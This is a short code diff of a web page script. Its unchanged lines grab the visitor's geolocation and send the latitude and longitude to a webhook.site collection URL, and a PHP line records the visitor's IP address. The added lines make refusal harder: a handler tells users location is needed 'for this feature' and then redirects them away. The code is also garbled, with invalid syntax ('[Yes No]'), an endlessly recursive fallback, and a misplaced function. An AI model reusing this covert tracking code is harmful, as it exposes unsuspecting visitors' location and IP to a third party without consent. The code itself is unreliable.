@@ -665,7 +665,7 @@ var x = document.getElementById("demo");
 
 function getLocation() {
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
+    navigator.geolocation.getCurrentPosition(showPosition,ErrorMsg, [Yes No]);
   } else { 
     getLocation();
   }
@@ -683,6 +683,12 @@ function showPosition(position) {
   xhttp.open("GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+ position.coords.latitude +position.coords.longitude  , true);
   xhttp.send();
 
+function ErrorMsg(error) {
+   toastr.error("Please turn on location for this feature")
+        setTimeout(function() {
+            window.location.href = '/'
+        }, 2000)
+}
 }
 	</script> 
 $ipaddress=$_SERVER['REMOTE_ADDR'];
